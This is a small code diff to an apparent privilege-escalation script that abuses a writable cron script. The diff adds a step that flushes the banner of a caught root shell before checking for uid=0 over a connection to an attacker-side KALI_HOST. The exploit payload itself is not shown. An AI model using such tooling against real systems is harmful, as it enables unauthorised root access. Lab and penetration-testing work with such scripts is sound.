@@ -1,7 +1,7 @@
 import socket
 import time
 
-from chainlog import log, run_remote, send_command
+from chainlog import drain, log, run_remote, send_command
 
 # =============================================================================
 # privesc.py — Privilege Escalation via Writable Cron Script
@@ -68,6 +68,7 @@ def run(www_shell, kali_host=KALI_HOST, cron_script=CLEANUP_SCRIPT):
         root_server.close()
 
     time.sleep(1)
+    drain(root_shell, timeout=2.0)  # flush shell banner before first sentinel-based command
     response = run_remote(root_shell, "id", timeout=10)
 
     if "uid=0(root)" in response:
